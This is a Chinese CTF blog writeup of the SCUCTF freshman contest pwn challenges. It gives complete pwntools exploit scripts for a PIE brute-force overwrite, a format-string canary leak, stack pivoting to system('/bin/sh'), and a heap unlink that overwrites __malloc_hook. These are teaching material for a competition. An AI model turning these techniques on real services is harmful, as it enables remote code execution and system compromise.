---
layout:     post   				    # 使用的布局（不需要改）
title:      SCUCTF_PWN部分writeup 				# 标题 
subtitle:   SCUCTF #副标题
date:       2018-12-30 				# 时间
author:     Mr.R 						# 作者
# header-img: img/post-bg-2015.jpg 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - CTF
---

> 朋友说有川大的新生赛.....尝试一下？(毕竟以后说不定还要去呢)



这篇文章仅记录pwn部分题解。感谢师傅们的帮助 毕竟我辣么菜



## 1.u_can_get

普通栈溢出…….就一个ret2syscall......没啥好说的

## 2.can_u_get

仍然是一个普通栈溢出......

但是开了pie,所以我们只需要覆盖ret最后两位,但是因为有一位的开头不知道,就只好爆破撞运气了

1/16呢

```python
from pwn import *
from time import sleep

while True:
    s = remote("119.23.206.23",10002)
    # while True:
    # s = process("./can_u_get(1)")
    # attach(s)
    # raw_input(">")
    padding = "a"*0x20
    padding += p64(1)
    payload = padding+'\xc5\xc8'
    print payload
    print hex(len(payload))
    # raw_input(">")
    s.send(payload)
    sleep(0.1)
    s.interactive()
    s.close()

```



## 3.canary

观察发现…..这里有格式化字符串漏洞……然后又开了canary,显然可以泄漏canary->栈溢出

需要注意的是

```
.text:08048696                 lea     esp, [ebp-8]
.text:08048699                 pop     ecx
.text:0804869A                 pop     ebx
.text:0804869B                 pop     ebp
.text:0804869C                 lea     esp, [ecx-4]
.text:0804869F                 retn
```

他这里在函数调用结束之后的返回方式与普通的不一样。所以需要自己手动调试一下找ret。

普通的返回方式是

```
leave  -> mov rsp rbp
		  pop rbp
		  
ret	   -> pop rdi
```

在这时ret地址是存在rbp之上的。

而这道题经调试发现,ret存的地址由canary下的值决定,默认是存在old_rbp+0x10的位置上(大概是吧...忘了…自己调试一下就知道了 emm)

于是我们在leak canary的时候应该顺便把canary下的值一起leak出来,在进行溢出的时候都填上,然后覆盖old_rbp+0x10为自己的地址就可以了.



```python
from pwn import *

# s = process("./can4ry")
s = remote('119.23.206.23',10001)
binsh=0x08048750
payload = "%31$p.%32$p"
# gdb.attach(s,"b *0x0804866E")
# raw_input()
s.sendline(payload)
canary = int(s.recv(10),16)
s.recv(1)
stack = int(s.recv(10),16)
print hex(canary)
print hex(stack)
# raw_input()
payload = 'A'*100+p32(canary)+p32(stack)+'A'*8+'B'*0x10+p64(0x08048596)
# print payload
s.sendline(payload)
s.sendline('ls')
s.interactive()
s.recvall()
```



## 4.pwnme

显然栈溢出...

发现他有一个count在计数,只允许溢出一次,但是我们还需要leak啥的一次肯定不够。这时候就想到了栈迁移。

关于栈迁移原理不多做讲解。。。反正就是可以控制ebp，带着leave ret的gadget就可以控制eip来执行我们自己的东西了

```python
from pwn import *
from LibcSearcher import *
from time import sleep

s = remote("119.23.206.23",10003)
elf = ELF("./pwnme/pwnme")

main = 0x080485E4
buf = elf.bss() + 0x500
buf2 = elf.bss() + 0x400
leave_ret = 0x08048498
pop1 = 0x080483a1
pop3 = 0x0804866d
pop_ebp = 0x0804866f
write_got = elf.got['write']
write_plt = elf.plt['write']
read_plt = elf.plt['read']

# gdb.attach(s,"b *0x08048498")
padding = 'a'*(4*4)+p32(buf)+p32(read_plt)+p32(leave_ret)+p32(0)+p32(buf)+p32(0x100)
payload = padding
raw_input(">")
s.sendline(payload)
payload = p32(buf2)+p32(write_plt)+p32(pop3)+p32(1)+p32(write_got)+p32(4)
payload += p32(read_plt)+p32(pop3)+p32(0)+p32(buf2)+p32(0x100)+p32(pop_ebp)+p32(buf2)+p32(leave_ret)
s.sendline(payload)
s.recvuntil("just PWN me\n")

write_real = s.recvn(4)
write_real = u32(write_real)
print hex(write_real)

libc = LibcSearcher('write',write_real)

offset = write_real-libc.dump('write')

system = libc.dump('system')+offset
bin_sh = libc.dump('str_bin_sh')+offset

payload = p32(buf2)+p32(system)+p32(pop3)+p32(bin_sh)

s.sendline(payload)
s.interactive()
```



这里有个需要注意的地方就是,我们在执行函数之后,要把压进栈中的参数手动pop出来,但是这里read,write都是有三个参数的函数,所以就需要pop3....但是这里pop3中有

```
pop ebp
```

会打乱我们的栈帧,所以在执行完函数之后我们应该手动pop ebp来控制ebp为bss上我们自己的值



## 5.getshell

还没做= = 以后有空再看



## 6.babyheap

分析程序,发现就实现了4个功能

```
1.add
2.del
3.edit
4.show
```



1.add的核心代码

```c
printf("length of your infomation(max 48): ");
    scanf("%u", &size);
    if ( (unsigned int)size > 0x1000 )
      LODWORD(size) = 4096;
    if ( (unsigned int)size <= 0x1F )
      LODWORD(size) = 32;
    buf[SHIDWORD(size)] = malloc((unsigned int)size);
    if ( buf[SHIDWORD(size)] )
    {
      puts("input your imformation: ");
      read(0, buf[SHIDWORD(size)], 0x30uLL);
    }
```

可以发现 size是我们可以控制的,而且read永远读入0x30,这也就是说如果我们申请一个较小的chunk 就可以造成堆溢出



2.del

就是个free…没啥好说的



3.edit

就是个edit.....

但是注意它有个限制,只能edit两次



4.show

```c
printf("[%d] %s\n", (unsigned int)i, buf[i]);
```

可以用来leak



看完了之后我们理一下思路

因为可以输入0x30 ,我们申请来的最小chunk是这样的

```
chunk1{
    prev_size
    size
    fd
    bk
    fd_next
    bk_nexk
}
```

我们输入的地方是fd,0x30 刚好可以覆盖下一个chunk的prev_size与size

这时候就可以考虑unlink



首先申请出一个small bin,并在里面构建fake_chunk

申请一个fastbin,用于溢出下一个small bin

申请一个small bin

释放掉fastbin,因为是fastbin的缘故,下次我们申请同样大小,仍然会是它

申请fastbin,在add信息的时候将下一个small bin的prev_size与size覆盖掉

将prev_size覆盖为第一个(distance smallbin1+0x10 smallbin2)

最后释放掉smallbin2 因为这时它认为上一块chunk就是smallbin1中我们伪造的chunk,会触发unlink



之后便任意读写地址......



1.覆盖bin[1],bin[2],bin[3]为

> addr(bin),free@got,0x602010

注意第三个0x602010是计数器的值,我们可以通过编辑它为0,来不停的进行edit

留下bin[1]为bin是为了以后我们再次修改这里的值



2.show()

这时候bin[2]的位置是free@got,可以leak出地址



3.edit

将bin[2]覆盖为__malloc_hook

```
	Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

因为是FULL RELRO,所以不能够修改got表(我眼瞎....在这里跪了好久)

我们选择修改__malloc_hook为onegadget



4.随便add一个

```python
from pwn import *
from LibcSearcher import LibcSearcher
from time import sleep


# s = process("babyheap")
s = remote('119.23.206.23',10000)
elf = ELF("babyheap")
libc = ELF("./libc.so.6")

def add(size,data):
    # data = data.ljust(0x30,'\x00')
    s.sendline("1")
    raw_input(">") 
    s.sendline(str(size))
    raw_input(">") 
    s.sendline(data)
    raw_input(">") 
    s.recvuntil("choice>")

def delete(idx):
    s.sendline("2")
    raw_input(">")    
    s.sendline(str(idx))
    raw_input(">")    
    s.recvuntil("choice>")

def edit(idx,data):
    s.sendline("3")
    raw_input(">")    
    s.sendline(str(idx))
    raw_input(">")    
    s.sendline(data)
    raw_input(">")    
    s.recvuntil("choice>")

def show():   
    s.sendline("4")

bss = 0x0602040
free_got = elf.got['free']

prev_size = 0
size = 0x130
fake_fd = bss+8-0x18
fake_bk = bss+8-0x10
fake_heap = p64(prev_size)+p64(size)+p64(fake_fd)+p64(fake_bk)
# gdb.attach(s,'b *0x00000000040092C')

add(0x100,fake_heap)

add(0x10,'0000')

add(0x100,'aaaa')

delete(2)
# raw_input(">")

fake_prev = 0x130
fake_size = 272
payload = 'A'*0x20+p64(fake_prev)+p64(fake_size)
add(0x10,payload)
delete(3)
# gdb.attach(s,'b *0x400A44')
padding = 'A'*0x10+'A'*8+p64(bss)+p64(free_got)+p64(0x602010)
edit(1,padding)
raw_input(">")
show()
s.recvuntil('[2] ')
free_real = s.recvn(8).ljust(8,'\x00')
free_real = u64(free_real)
print hex(free_real)
free_real = int(hex(free_real).replace('0x5b0a','0x'),16)
libc = LibcSearcher("free",free_real)
offset = free_real - libc.dump('free')
print hex(offset)
onegadget = 0xf1147+offset
edit(3,p64(0))

malloc_hook = libc.dump('__malloc_hook')+offset
payload = 'A'*8+p64(bss)+p64(malloc_hook)
edit(1,payload)
# gdb.attach(s,'b *0x400A44')
edit(2,p64(onegadget))
add(0x100,'aaaa')
s.interactive()


```



至此....结束…感谢师傅们的帮助